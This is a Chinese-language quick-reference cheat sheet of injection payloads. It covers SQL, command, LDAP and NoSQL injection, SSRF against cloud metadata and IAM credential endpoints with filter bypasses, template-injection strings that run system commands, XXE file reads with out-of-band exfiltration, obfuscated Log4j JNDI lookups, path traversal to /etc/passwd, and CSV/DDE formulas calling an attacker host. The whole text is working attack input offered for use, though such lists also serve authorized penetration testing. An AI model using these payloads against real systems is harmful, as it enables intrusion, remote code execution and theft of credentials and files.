# 注入 payload 矩阵（快速参考）

## SQL 注入

### 报错型
```
'                       -- 触发报错
"                        -- 同上
1 OR 1=1                 -- 布尔总真
1 OR '1'='1'             -- 字符串版
1' OR '1'='1' --         -- 注释
1' OR '1'='1             -- 无注释
1) OR (1=1               -- 括号
1, 1                     -- 列错位
NULL                     -- 类型错误
```

### 时间盲注
```
MySQL:      1 AND SLEEP(3)
MySQL:      1' AND SLEEP(3)--
PostgreSQL: 1 AND pg_sleep(3)
PostgreSQL: 1' AND pg_sleep(3)--
MSSQL:      1; WAITFOR DELAY '0:0:3'--
SQLite:     1' AND (SELECT COUNT(*) FROM sqlite_master) > 0--
Oracle:     1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)
```

### UNION 注入
```
-1 UNION SELECT 1,2,3,4,5,6,7,8,9,10--
-1 UNION SELECT NULL,NULL,NULL--
```

### Header SQLi
```
User-Agent: ' OR '1'='1
X-Forwarded-For: 1.1.1.1' OR SLEEP(3)--
Cookie: session=' OR '1'='1
Referer: http://x/' OR '1'='1
```

## 命令注入

### 分号变体
```
127.0.0.1;id
127.0.0.1&id
127.0.0.1|id
127.0.0.1&id
127.0.0.1&whoami
127.0.0.1&sleep 3
```

### 换行变体
```
127.0.0.1%0aid
127.0.0.1%0did
127.0.0.1%0aid%0a
```

### 反引号 / $()
```
`id`
$(id)
$((echo id)|sh)
```

### Header
```
User-Agent: `id`
X-Forwarded-For: `sleep 3`
Accept-Language: `curl http://oast/`
```

## SSRF

### 云元数据
```
http://169.254.169.254/latest/meta-data/
http://100.100.100.200/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/iam/security-credentials/
```

### 内网
```
http://127.0.0.1:80/
http://127.0.0.1:8080/
http://127.0.0.1:6379/
http://127.0.0.1:3306/
http://192.168.1.1/
http://10.0.0.1/
http://172.16.0.1/
http://[::1]/
```

### 编码绕过
```
http://2852049966/                      # 169.254.169.254 十进制
http://0x28.0x28.0x28.0x28/             # 127.0.0.120
http://127.1/                          # 简写
http://0/                              # 127.0.0.1 简写
http://evil.com@169.254.169.254/       # 认证绕过
http://169.254.169.254.nip.io/         # DNS
```

### Scheme 绕过
```
file:///etc/passwd
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/INFO
ftp://169.254.169.254/
ldap://169.254.169.254/
```

## SSTI

### Jinja2 (Django/Flask)
```
{{7*7}}
{{config.items()}}
{{self.__init__.__globals__}}
{{''.__class__.__mro__}}
{{get_flashed_messages.__globals__}}
{% if __import__('os').system('id') %}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
<#assign a="exec">["id"]?api["${a}"]
```

### Thymeleaf
```
[[*{7+7}]]
${7+7}
__${jndi:ldap://oast/}__
```

### Velocity
```
$7*$7
#set($x=1)$x
${"execute".execute("id")}
${T(java.lang.Runtime).getRuntime().exec("id")}
```

### Twig
```
{{7*7}}
{{_self.env}}
{{_self.env.get('debug')}}
{{attribute(_self, "dump")}}
{{""|class}}
```

### ERB
```
<%= 7*7 %>
<%= `id` %>
<% system("id") %>
```

## XXE

### 文件读
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### OOB
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://<oast>/xxe">
]>
<foo>&xxe;</foo>
```

### 参数实体
```xml
<!DOCTYPE foo [
  <!ENTITY % local SYSTEM "file:///etc/passwd">
  <!ENTITY % evaluate SYSTEM "http://<oast>/%local">
]>
%evaluate;
```

## Log4j

### 基础
```
${jndi:ldap://<oast>/log4j}
${jndi:rdap://<oast>/log4j}
${jndi:ldaps://<oast>/log4j}
${jndi:dns://<oast>/log4j}
${jndi:rmi://<oast>/log4j}
```

### 编码绕过
```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://<oast>/log4j}
${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://<oast>/log4j}
${${env:BARFOO:-j}ndi:ldap://<oast>/log4j}
${${jndi${::-:}ldap://<oast>/log4j}}
```

## LDAP 注入
```
admin*)(uid=*))(&
admin*)(objectClass=*))(|
*)(uid=*))(&
```

## NoSQL 注入
```json
{"user": {"$ne": null}}
{"user": {"$gt": ""}}
{"user": "$where", "password": "1==1"}
{"user": {"$regex": "^admin"}}
```

## 路径遍历
```
../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc/passwd
..%255c..%255cwindows%255cwin.ini
```

## CSV 注入
```
=cmd|'/c calc'!A1
=DDE(DDEAUTO\http://attacker/1)
=HYPERLINK("http://attacker")
```
